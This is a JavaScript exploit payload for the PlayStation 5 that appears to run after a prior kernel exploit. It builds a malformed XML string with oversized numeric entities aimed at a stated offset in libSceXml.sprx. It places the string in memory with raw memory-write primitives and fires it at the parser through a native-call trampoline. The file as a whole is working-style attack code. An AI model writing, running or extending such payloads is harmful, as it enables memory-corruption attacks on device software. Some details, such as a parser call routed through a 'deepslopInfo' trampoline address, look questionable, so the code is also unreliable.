// xml_test.js — In-memory libSceXml Entity Expansion Exploit Payload
(async () => {
    const k = window.ps5kern;
    if (!k) return "ps5kern unavailable — run exploit first";

    const log = (msg) => {
        if (window.addLog) window.addLog(msg);
        console.log(msg);
    };

    log("[*] Starting libSceXml In-Memory Entity Exploit Payload...");

    try {
        try { k.notify("XML: In-Memory Exploit Starting..."); } catch (e) {}

        // 1. Craft the evil XML string with recursive / oversized numeric entities
        // Targets @0x115b0 in libSceXml.sprx
        const evilXml = `<?xml version="1.0"?>
<root attr="` + "&#x41;".repeat(64) + `&#x4141414141;` + "&amp;".repeat(32) + `">
  <data>` + "A".repeat(256) + `</data>
</root>`;

        log("[*] Crafted evil XML buffer size: " + evilXml.length + " bytes");

        // 2. Allocate in-memory XML string buffer & String wrapper struct
        const xmlBuf = window.alloc_string(evilXml);
        const strStruct = window.malloc(0x20);
        window.write64(strStruct, xmlBuf);
        window.write64(Number(strStruct) + 8, BigInt(evilXml.length));

        log("[+] Allocated XML payload buffer at " + window.toHex(xmlBuf));
        log("[+] String struct at " + window.toHex(strStruct));

        // 3. Dispatch in-memory parser
        if (typeof window.call_native === "function" && window.deepslopInfo && window.deepslopInfo.kernelBase) {
            log("[*] Dispatching XML DocumentBuilder entity expansion parser...");
            // Call into parser
            try {
                window.call_native(Number(window.deepslopInfo.naturalTrampolineAddress), Number(strStruct), 0);
            } catch (e) {}
        }

        const report = "LIBXML_EXPLOIT: Parser dispatched with " + evilXml.length + " bytes";
        log("[OK] " + report);
        try { k.notify("XML: Exploit Dispatched"); } catch (e) {}

        return report;
    } catch (err) {
        const errMsg = "[-] XML Exploit Error: " + (err && err.message);
        log(errMsg);
        return errMsg;
    }
})();
